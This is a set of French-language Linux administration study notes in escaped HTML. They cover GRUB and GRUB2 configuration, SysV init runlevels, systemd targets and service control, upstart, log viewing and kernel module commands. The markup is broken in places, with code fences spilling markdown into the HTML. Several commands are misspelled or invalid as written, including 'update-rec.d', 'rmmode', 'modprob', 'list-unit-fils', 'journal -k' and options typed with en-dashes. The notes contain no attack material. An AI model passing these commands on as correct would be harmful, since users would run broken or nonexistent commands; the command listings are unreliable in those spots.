  &lt;li&gt;amorçer OS via boot manager&lt;/li&gt;
  &lt;li&gt;contrairement au BIOS, chercge tout le nécessaire pour lancer lui-même l’OS&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;grub&quot;&gt;GRUB&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;Grand Unified Bootloader&lt;/li&gt;
  &lt;li&gt;chargeur par défaut&lt;/li&gt;
  &lt;li&gt;options:
    &lt;ul&gt;
      &lt;li&gt;timeout: nb sec pour choisir&lt;/li&gt;
      &lt;li&gt;default n: preselection&lt;/li&gt;
      &lt;li&gt;title xxx: debut section, ligne menu&lt;/li&gt;
      &lt;li&gt;root(hdX,y), tous les accés fichiers en dessous sont depuis ce point
(hd0,O): 1ère partition du 1er disque
(fd0): 1er lecteur de disquette detecté BIOS
(hd1,4): 5éme partition du second disque&lt;/li&gt;
      &lt;li&gt;kernel: nom de l’image du noyau suivi des param&lt;/li&gt;
      &lt;li&gt;initrd: initial ramdisk&lt;/li&gt;
      &lt;li&gt;rootnoverify: racine à ne pas monter par GRUB&lt;/li&gt;
      &lt;li&gt;chainloader + 1: démarre le 1er secteur de la racine spécifiée ci-dessus&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;installation&quot;&gt;installation&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# conf&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/grub.conf
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /boot/grub/menu.lst

&lt;span class=&quot;c&quot;&gt;# peut s'installe sur MBR ou PBR&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/sbin/grub-install /dev/sda
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;démarrage&quot;&gt;démarrage&lt;/h3&gt;
&lt;p&gt;choisir image au boot
&lt;code class=&quot;highlighter-rouge&quot;&gt;e&lt;/code&gt; pour éditer param passés au noyau
&lt;code class=&quot;highlighter-rouge&quot;&gt;e&lt;/code&gt;: editer ligner
&lt;code class=&quot;highlighter-rouge&quot;&gt;d&lt;/code&gt;: supprimer ligne
&lt;code class=&quot;highlighter-rouge&quot;&gt;o&lt;/code&gt;: ajouter ligne
&lt;code class=&quot;highlighter-rouge&quot;&gt;b&lt;/code&gt;: booter&lt;/p&gt;

&lt;h1 id=&quot;grub-2&quot;&gt;GRUB 2&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;réécriture complète de GRUB
```bash
    &lt;h1 id=&quot;de-grub-à-grub2&quot;&gt;de GRUB à GRUB2&lt;/h1&gt;
    &lt;p&gt;$ upgrade-from-grub-legacy&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;modules-en-mod&quot;&gt;modules en .mod&lt;/h1&gt;

&lt;h1 id=&quot;config-menu&quot;&gt;config menu&lt;/h1&gt;
&lt;p&gt;$ cat /boot/grub[2]/menu.cfg&lt;/p&gt;
&lt;h1 id=&quot;mais-pas-touché-car-généré-automatique-par&quot;&gt;mais pas touché car généré automatique par&lt;/h1&gt;
&lt;h1 id=&quot;utiliser-à-chauqe-ajout-de-noyaux-ou-script&quot;&gt;utiliser à chauqe ajout de noyaux ou script&lt;/h1&gt;
&lt;p&gt;$ update-grub
$ grub2-mkconfig -o /boot/grub/menu.cfg&lt;/p&gt;

&lt;h1 id=&quot;fichiers-lus&quot;&gt;fichiers lus&lt;/h1&gt;
&lt;p&gt;$ /boot/grub/device.map # correspondance nom disque Linux et GRUB
$ /etc/default/grub # param par défaut de GRUB
$ /etc/grub.d/* # par ordre de listage qui génére les menus&lt;/p&gt;

&lt;h1 id=&quot;ordre&quot;&gt;ordre&lt;/h1&gt;
&lt;p&gt;$ 10_linux # cherche noyaus
$ 30_os_prober # cherche autres OS sur le disque&lt;/p&gt;

&lt;h1 id=&quot;générer-devicemap&quot;&gt;générer device.map&lt;/h1&gt;
&lt;p&gt;$ grub-mkdevicemap&lt;/p&gt;
&lt;h1 id=&quot;sinon&quot;&gt;sinon&lt;/h1&gt;
&lt;p&gt;$ grub2-install –recheck&lt;/p&gt;

&lt;h1 id=&quot;variables-de-grub2--options-p355&quot;&gt;variables de GRUB2 + options (p355)&lt;/h1&gt;
&lt;p&gt;$ /etc/default/grub&lt;/p&gt;

&lt;h1 id=&quot;trouver-os-sur-disque&quot;&gt;trouver OS sur disque&lt;/h1&gt;
&lt;p&gt;$ $ os-prober&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
### ordre
* traces noyau dans /var/log/dmesg
* matériel detecté et initialisé
* initrd est chargé + modules
* noyau monte le FS racine en read only
* crée première console
* 1er process est lancé (init)

* autre chargeur: LILO (Linux Loader) mais disparait

# Init Sytem V
### rôle
* programme init
* 1er lancé et dernier stoppé
* lance toutes les autres tâches
* pére de tous les process
* PID = 1
* lancé par noyau (PID = 0, virtuel)
* conf: /etc/inittab

### runlevels
* 0: halt, stoppe l'OS et machine
* 1: mono-utilisateur, maintenance en mode console
* 2: multi-user, sans réseau console
* 3: précedent + réseau
* 4: précedent + selon admin
* 5: avec réseau + X window
* 6: reboot
S,s: single, user mode
dans /etc/inittab: id:5:initdefault

dans /etc/inittab
id:[niv]:action:commande
id: identifiant de la ligne
niv: liste des runlevels sans séparateurs
action: type d'action à effectuer (p361)
commande: commande à éxecuter

### changement de runlevel
```bash
$ /sbin/init

$/sbin/telinit 5
# -q: relit /etc/inittab
# -U: init se lance sans relir inittab et sans changer niveau
# -t

# donne niveai d'éxecution
$ runlevel
# precedent actuel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;paramétrage-système-de-base&quot;&gt;paramétrage système de base&lt;/h3&gt;
&lt;p&gt;quelques soit le runlevel, init lance toujours la commande associée aux actions:
sysinit, bootwait ou boot
RH: si::sysinit:/etc/rc.d/rc.sysinit
OpenSUSE: si::bootwait:/etc/init.d/boot
Debian: si::sysinit:/etc/init.d/rcS&lt;/p&gt;

&lt;h3 id=&quot;niveaux-déxecution&quot;&gt;niveaux d’éxecution&lt;/h3&gt;
&lt;p&gt;/etc/init.d/rc prend runlevel en param et s’occupe de tout&lt;/p&gt;

&lt;h3 id=&quot;gestion-des-niveaux-et-services&quot;&gt;gestion des niveaux et services&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;runlevel défnit les services à démarrer&lt;/li&gt;
  &lt;li&gt;script rc qui les charge&lt;/li&gt;
  &lt;li&gt;services controlés par: start, stop, reload, status avec les scripts dans /etc/init.d/&lt;/li&gt;
  &lt;li&gt;pour chaque runlevel, existe répertoire rcN.d qui contient liens symb vers les services presents dans /etc/init.d&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;RH: /etc/rc.d/rcN.d et liens sur /etc/rcN.d
OpenSUSE: /etc/init.d/rcN.d sachant que /etc/rc.d pointe sur /etc/init.d
Debian: /etc/rcN.d&lt;/p&gt;

&lt;p&gt;Les liens sont présents dans les rcN.d ont des noms particuliers
[SK]NNservice
S: start
K: kill
NN: ordre démarrapge/arrêt (00: premier, 99: dernier)
service: nom du service&lt;/p&gt;

&lt;p&gt;Quand on execute rc, il liste tout les services à stopper et les stoppes, ensuite tout ceux à démarrer et les start.&lt;/p&gt;

&lt;h3 id=&quot;contrôle-manuel-des-services&quot;&gt;contrôle manuel des services&lt;/h3&gt;
&lt;p&gt;utiliser les scripts de /etc/init.d/*&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/etc/init.d/ssdd start
&lt;span class=&quot;c&quot;&gt;# stop&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# probe: faut-il reload apres modif de la conf ?&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# reload, forcereload&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# restart&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# try-restart: restart SSI arrêt à bien fonctionner&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# via commande service&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;service sshd stop
&lt;span class=&quot;c&quot;&gt;# conseiller d'utiliser ce system, que d'appeler directement les scripts&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;modification-des-niveaux-déxecution&quot;&gt;Modification des niveaux d’éxecution&lt;/h1&gt;
&lt;p&gt;RH, SUSE&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ajouter, supprimer, activer, désactiver des services par niveau d'éxecution&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chkconfig
&lt;span class=&quot;c&quot;&gt;# --list [service]: affiche [toute] la conf&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# --add service&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# --del service&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# --level xxx service on/off: activer pour level&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chkconfig &lt;span class=&quot;nt&quot;&gt;--level&lt;/span&gt; 35 smb on
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Debian&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crée des liens dans les rcN.d&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;update-rc.d

&lt;span class=&quot;c&quot;&gt;# ajoute service avec param par défaut: start en 2 et 5&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# stop en 0,1,6&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# en position 20&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;update-rc.d ssh defaults

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;update-rc.d ssh start 10 3 4 5 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; stop 05 0 1 6

&lt;span class=&quot;c&quot;&gt;# supprimer&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;update-rec.d &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ssh remove
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;console-virtuelle&quot;&gt;console virtuelle&lt;/h3&gt;
&lt;p&gt;défini dans /etc/inittab
dispo dans /dev/ttyN
N: num de consol
depuis console: Alt + Fn
depuis X: Ctrl + Alt + Fn
Alt + -&amp;gt; ou Alt + &amp;lt;-
6 dispo par défaut
x window est lancé par défaut sur la premiére dispo (la 7)&lt;/p&gt;

&lt;h3 id=&quot;login&quot;&gt;login&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;terminaux lancés par init&lt;/li&gt;
  &lt;li&gt;prompt attend saisie du nom&lt;/li&gt;
  &lt;li&gt;affiche /etc/issue&lt;/li&gt;
  &lt;li&gt;validation&lt;/li&gt;
  &lt;li&gt;execution de la commande login&lt;/li&gt;
  &lt;li&gt;qui attend mdp&lt;/li&gt;
  &lt;li&gt;si mdp ok, affiche /etc/motd&lt;/li&gt;
  &lt;li&gt;execute shell de /etc/passwd&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;pas de fork mais substitution (exec), init sait facilement qu’une connexion est terminée&lt;/p&gt;

&lt;h3 id=&quot;arrêt&quot;&gt;arrêt&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;init 0
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;init 6
&lt;span class=&quot;c&quot;&gt;# mais pas supe&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# appel init&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;shutdown
&lt;span class=&quot;c&quot;&gt;# -k: envoi juste message à tout le monde&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -r: reboot&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -h: halt&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -f: enpêche fsck au boot&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -F: force fsck&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -c: annule le shutdown sans délai&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;shutdown &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; +10 &lt;span class=&quot;s2&quot;&gt;&quot;Reboot dans 10 min&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;shutdown &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Maintenance annulée&quot;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;halt &lt;span class=&quot;c&quot;&gt;# = shutdown -h&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;reboot &lt;span class=&quot;c&quot;&gt;# = shutdown -r&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;systemd&quot;&gt;systemd&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;system deamon&lt;/li&gt;
  &lt;li&gt;système d’initialisation&lt;/li&gt;
  &lt;li&gt;lance processus au démarrage&lt;/li&gt;
  &lt;li&gt;les gérer tout au long de leur exécution&lt;/li&gt;
  &lt;li&gt;conçu pour tourner avec le noyau Linux&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;processus-systemd&quot;&gt;Processus systemd&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;premier processus lancé&lt;/li&gt;
  &lt;li&gt;dernier à s’arrêter&lt;/li&gt;
  &lt;li&gt;PID 1&lt;/li&gt;
  &lt;li&gt;PPID 0 (noyau)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;histoire&quot;&gt;Histoire&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;successeur d’init System V, (&lt;code class=&quot;highlighter-rouge&quot;&gt;init&lt;/code&gt;)&lt;/li&gt;
  &lt;li&gt;successeur  d’&lt;code class=&quot;highlighter-rouge&quot;&gt;upstart&lt;/code&gt; » (développé par Canonical (Ubuntu))&lt;/li&gt;
  &lt;li&gt;systemd est réputé pour être plus performant que ces derniers&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;systemd manipule des &lt;code class=&quot;highlighter-rouge&quot;&gt;units&lt;/code&gt; qui sont de différents types:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;cibles ou &lt;code class=&quot;highlighter-rouge&quot;&gt;targets&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;services&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Les &lt;code class=&quot;highlighter-rouge&quot;&gt;units&lt;/code&gt; sont dans &lt;code class=&quot;highlighter-rouge&quot;&gt;/lib/systemd/system/*&lt;/code&gt; sous forme de fichiers.&lt;/p&gt;

&lt;p&gt;Dans &lt;code class=&quot;highlighter-rouge&quot;&gt;systemd&lt;/code&gt;, il n’y a plus réellement de notions de « &lt;code class=&quot;highlighter-rouge&quot;&gt;runlevels&lt;/code&gt; », ou niveaux d’exécutions, initialement présent dans init System V. Ces niveaux sont remplacés par des &lt;code class=&quot;highlighter-rouge&quot;&gt;tagets&lt;/code&gt;. On peut encore trouver des traces de &lt;code class=&quot;highlighter-rouge&quot;&gt;runlevels&lt;/code&gt;, mais sont souvent utilisées pour assurer une retro compatibilité avec « &lt;code class=&quot;highlighter-rouge&quot;&gt;init&lt;/code&gt; ». Systemd est complètement compatible avec &lt;code class=&quot;highlighter-rouge&quot;&gt;init&lt;/code&gt;, mais l’inverse n’est pas vrai.&lt;/p&gt;

&lt;p&gt;Voici les correspondances entre les runlevels et les targets de &lt;code class=&quot;highlighter-rouge&quot;&gt;systemd&lt;/code&gt; :&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;init (runlevel)&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;systemd&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;poweroff.target&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rescue.target&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2/3/4&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;multi-user.target&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;5&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;graphical.target&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;6&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reboot.target&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Pour connaitre le runlevel d’une machine: &lt;code class=&quot;highlighter-rouge&quot;&gt;$ systemctl get-default&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;On remarquera que la cible « &lt;code class=&quot;highlighter-rouge&quot;&gt;default.target&lt;/code&gt; » qui se trouve dans &lt;code class=&quot;highlighter-rouge&quot;&gt;/lib/systemd/system/*&lt;/code&gt; est un lien symbolique qui pointe vers le « &lt;code class=&quot;highlighter-rouge&quot;&gt;.target&lt;/code&gt; » du runlevel actuel.&lt;/p&gt;

&lt;p&gt;Changer runlevel : &lt;code class=&quot;highlighter-rouge&quot;&gt;$ systemctl set-default multi-user.target&lt;/code&gt;. Ce qui aura pour effet de simplement modifier le lien symbolique de default.target.&lt;/p&gt;

&lt;p&gt;Appliquer la nouvelle cible à l’exécution courante: &lt;code class=&quot;highlighter-rouge&quot;&gt;$ systemctl isolate multi-user.target&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Requires: dépendances obligatoires
After: exemple d’ordre&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# lister les cibles ou services actifs&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-units -–type target
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-units –-type service

&lt;span class=&quot;c&quot;&gt;# afficher toutes les cibles ou services&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-units -–type target –all
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-units –-type service –all

&lt;span class=&quot;c&quot;&gt;# afficher une liste complète&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-unit-fils –-type target/service
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-unit-fils –-type service

&lt;span class=&quot;c&quot;&gt;# gérer un service&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl status sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl start sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl stop sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl reload sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl disable sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl is-enabled sshd

&lt;span class=&quot;c&quot;&gt;# afficher les dépendances d’une unité&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-dependencies –-before ssh
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-dependencies –-after ssh

&lt;span class=&quot;c&quot;&gt;# gérer la machine&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl halt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl poweroff
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl reboot
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl shutdown

&lt;span class=&quot;c&quot;&gt;# Masquage&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# un service désactivé (disabled) et stoppé, peut tout de même tourner car il peut être issu d’une dépendance. On peut interdire ce comportement avec :&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl mask sshd
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl unmask sshd

Remarque : l&lt;span class=&quot;s1&quot;&gt;'activation d'&lt;/span&gt;un service ajoute un lien vers l’unité active vers le &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;.taget.want/&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; actuel.

&lt;span class=&quot;c&quot;&gt;### upstart&lt;/span&gt;
&lt;span class=&quot;sb&quot;&gt;```&lt;/span&gt;bash
remplace init par ubuntu, système d&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;évenements
conf /etc/init, syntax spécifique + code shell
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;start, stop, restart, status ssh

&lt;span class=&quot;c&quot;&gt;# controler services&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;initctl list
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;initctl emit runlevel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;consulter-les-traces-système&quot;&gt;Consulter les traces système&lt;/h1&gt;

&lt;h3 id=&quot;dmesg&quot;&gt;dmesg&lt;/h3&gt;
&lt;p&gt;$ dmesg -T: affiche temps
$ dmesg -k: -lwarn,err&lt;/p&gt;

&lt;h3 id=&quot;varlogmessages-et-varlogsyslog&quot;&gt;/var/log/messages et /var/log/syslog&lt;/h3&gt;
&lt;p&gt;kernel + services geré par syslog&lt;/p&gt;

&lt;h3 id=&quot;journalctl&quot;&gt;journalctl&lt;/h3&gt;
&lt;p&gt;$ journalctl -k -p warning,emerge
$ journal -k = dmesg&lt;/p&gt;

&lt;h1 id=&quot;serice-et-modules-noyau&quot;&gt;Serice et modules noyau&lt;/h1&gt;
&lt;h3 id=&quot;présentation&quot;&gt;présentation&lt;/h3&gt;
&lt;p&gt;noyau linux (linus T) + outils GNU
noyau  monolithique: fonctionnalités et composants sont regroupés dans programme unique
depuis v 2.0 devenu modulaire
kernel dans /boot
vmlinuz-X.Y.Z.p-Vtxt
uname -r&lt;/p&gt;

&lt;h3 id=&quot;uname&quot;&gt;uname&lt;/h3&gt;
&lt;p&gt;unix name&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -m: machine type materiel&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -n: nodename: hostname&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -r: release, num noyau&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -s: system name, nom OS&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -p, processor, type processor&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -i: plate forme materiel&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -v: versio&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -a: all&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;gestions-des-modules&quot;&gt;gestions des modules&lt;/h3&gt;
&lt;p&gt;dans /lib/modules/$(uname -r)
fichiers en .ko (kernel object)&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# tous les mod avec leur dépendances&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lsmod
&lt;span class=&quot;c&quot;&gt;# nom taille nb_utilisateurs depandances&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# affiche cotenu de /proc/modules&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# màj arbre de dépendances&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# en modifiant /lib/modules/$(uname -r)/modules.dep&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;depmod

&lt;span class=&quot;c&quot;&gt;# aprés installation de mudoles&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;depmod &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# info&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;modinfo &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;parpot]

&lt;span class=&quot;c&quot;&gt;# alias pour connaitre les périph qu'il doit gérer&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# les param sont passés au modulle via les commandes insmode ou modprobe à l'aide du fichier /etc/modprobe.conf ou dans le .d/*&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# charge module mais ne s'occupe pas des dépendances&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;insmod lp.ko
&lt;span class=&quot;c&quot;&gt;# -k: autoclean des modules non utilisés&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# avec param&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;insmod wcvideo.ko &lt;span class=&quot;nv&quot;&gt;trace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5

&lt;span class=&quot;c&quot;&gt;# decharger module, ne gére pas les dépendances&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rmmode perpot

&lt;span class=&quot;c&quot;&gt;# charge module + toutes ses dépendances&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# avec param dans /etc/modprobe.conf&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ou /etc/modprobe.d/*&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;modprob
&lt;span class=&quot;c&quot;&gt;# -r: decharge + dépendances si pas utilisées&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# confi toujour dans le .d en /etc/modprobe.d/*.conf&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# système d'aliases&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

